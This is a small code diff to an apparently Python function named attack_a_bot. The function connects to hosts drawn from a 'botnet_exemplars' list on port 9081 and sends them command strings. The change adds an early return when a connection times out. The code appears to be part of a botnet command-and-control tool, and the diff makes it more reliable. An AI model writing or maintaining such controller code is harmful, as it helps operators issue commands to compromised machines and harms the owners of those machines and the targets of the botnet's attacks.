@@ -42,6 +42,7 @@ def attack_a_bot(botnet_exemplars_ipv4, commandlet):
             sock.connect((botnet_exemplars_ipv4, 9081))
         except TimeoutError:
             print(f"[{botnet_exemplars_ipv4}] - [{commandlet}] Timed out")
+            return
         sock.settimeout(None)
         sock.send(commandlet.encode("utf-8"))
         if commandlet in doublearg_cmdlets:
